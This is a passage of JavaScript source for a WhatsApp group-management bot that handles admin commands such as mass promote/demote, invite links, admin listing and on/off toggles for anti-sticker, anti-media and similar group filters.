 if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
  const xeonpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await Yuta.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcyuta(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
 if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
 if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
  const xeondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xeondemoteall) {
 await Yuta.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcyuta(`Success`);
}
break
			case 'ephemeral': {
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
                if (args[0] === 'on') {
                    await Yuta.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcyuta(`Done`)
                } else if (args[0] === 'off') {
                    await Yuta.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcyuta(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
			case 'invite': {
	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!text) return replygcyuta(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 6285752535878`)
if (text.includes('+')) return replygcyuta(`Enter the number together without *+*`)
if (isNaN(text)) return replygcyuta(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Yuta.groupInviteCode(group)
      await Yuta.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcyuta(` An invite link is sent to the user`) 
}
break
			case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
   
}
break
			case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':{
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isAdmin && !isGroupOwner && !YutaTheCreator) return XeonStickAdmin()
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
                let response = await Yuta.groupInviteCode(m.chat)
                Yuta.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                }
            break
			case 'antipoll':{
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antipoll = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antipoll = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antisticker = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antisticker = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antiimage = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antiimage = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antivideo = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antivideo = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex': case 'antivirus':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antivirtex = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antivirtex = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'unavailable':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcyuta(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcyuta(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'welcome':
            case 'left': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  welcome = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  replygcyuta(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               if (args[0] === 'on') {
                  db.data.groups[m.chat].setinfo = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].setinfo = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
			case 'antiviewonce':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antiviewonce = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.groups[m.chat].antiviewonce = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ʙᴏᴛ ʜᴀʀᴜs ᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅᴜʟᴜ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
               
               if (args[0] === 'on') {
                  db.data.groups[m.chat].antimedia = true
                  replygcyuta(`${command} is enabled`)
